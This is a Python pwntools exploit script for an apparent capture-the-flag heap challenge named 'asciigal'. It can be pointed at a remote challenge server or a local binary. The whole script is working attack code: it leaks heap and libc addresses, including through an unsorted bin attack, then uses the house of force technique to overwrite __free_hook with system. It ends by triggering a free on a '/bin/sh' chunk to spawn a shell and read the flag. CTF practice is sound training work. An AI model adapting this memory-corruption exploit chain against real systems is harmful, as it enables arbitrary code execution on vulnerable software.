#!/usr/bin/python3
from pwn import *
import sys
import time


def new_article(name, size, payload):
    p.recvuntil("> ")
    p.sendline("0")
    p.recvuntil("name> ")
    p.sendline(name)
    p.recvuntil("art sz> ")
    p.sendline("%d" % size)
    time.sleep(0.05)
    p.sendline(payload)


def print_article(id):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("art#> ")
    p.sendline("%d" % id)


def delete_article(id):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("art#> ")
    p.sendline("%d" % id)


def edit_article(id, name, size, payload):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("art#> ")
    p.sendline("%d" % id)
    p.recvuntil("name> ")
    p.sendline(name)
    p.recvuntil("art sz> ")
    p.sendline("%d" % size)
    time.sleep(0.05)
    p.sendline(payload)


def start():
    global p, libc, offset
    try:
        if(sys.argv[1] == "-r"):
            host, port = "jinblack.it", 3004
            p = remote(host, port)

        elif(sys.argv[1] == "-d"):
            gdb_script = """
				c
			"""
            p = process("./asciigal", env={'LD_PRELOAD': './libc-2.27.so'})
            gdb.attach(p, gdb_script)
            #libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    except:
        print("Starting locally")
        print("Usage ./x.py [-OPTIONS]")
        print("-r to work remotely")
        print("-d to debug")
        #libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        p = process("./asciigal", env={'LD_PRELOAD': './libc-2.27.so'})


global p, elf, libc
context(arch='x86_64', os='linux', endian='little',
        word_size='64')  # , log_level ="DEBUG")
elf = ELF("./asciigal")
libc = ELF("./libc-2.27.so")
libc_offset = 0x3ebca0
heap_offset = 0x460
top_chunk_offset = 0xef8
start()

# Leaking the heap
print("[1]-Leaking heap addresses...")
new_article("A"*4, 32, "A"*4)
new_article("B"*4, 32, "B"*4)

delete_article(1)

new_article("A"*4, 32, "A"*4)
print_article(1)

heap_leak = u64(p.recv(42)[34:])
heap_base = heap_leak + heap_offset
top_chunk = heap_base + top_chunk_offset
print("\t\tHeap base address: ", hex(heap_base))
print("\t\tTop chunk address: ", hex(top_chunk))

for i in range(1, 3):
    delete_article(i)

# Leaking libc with unsorted bin attack
print("[2]-Leaking libc addresses...")
for i in range(10):
    new_article("abcdef%d" % i, 0x150, "%d" % i)
    time.sleep(0.05)

for i in range(1, 10):
    delete_article(i)
    time.sleep(0.05)

for i in range(10):
    new_article("qwert%d" % (i), 0x150, "")
    time.sleep(0.05)

print_article(8)

libc_leak = u64(p.recv(35)[28:]+b"\x00")
# Setting the base address of libc with the leaked one
libc.address = libc_leak - libc_offset
print("\t\tLibc leaked address: ", hex(libc_leak))
print("\t\tLibc base address: ", hex(libc.address))
print("\t\tFree_hook address:", hex(libc.symbols['__free_hook']))

# House of force
print("[3]-Preparing house of force...")
malloc_size = (libc.symbols['__free_hook'] - top_chunk - 0x20)
payload = b"\x00"*0x158 + p64(0xffffffffffffffff) + b"\x00"*0x10

# Overwrite the top chunk size and set the article name to '/bin/sh\x00'
print("[4]-Overwriting the top chunk size...")
edit_article(7, "/bin/sh\x00", len(payload) + 0x20, payload)

# To free up some space
delete_article(1)
delete_article(3)

# Moving the top_chunk
new_article(b"whatever", malloc_size, b"WHATEVER")

# Overwrite __free_hook
print("[5]-Overwriting __free_hook with the system address...")
new_article("powned", 123, p64(libc.symbols['system'])*3)

# Hijack the control flow
delete_article(7)
time.sleep(1)

print("[6]-Getting the flag:")
p.sendline('cat flag')
p.interactive()
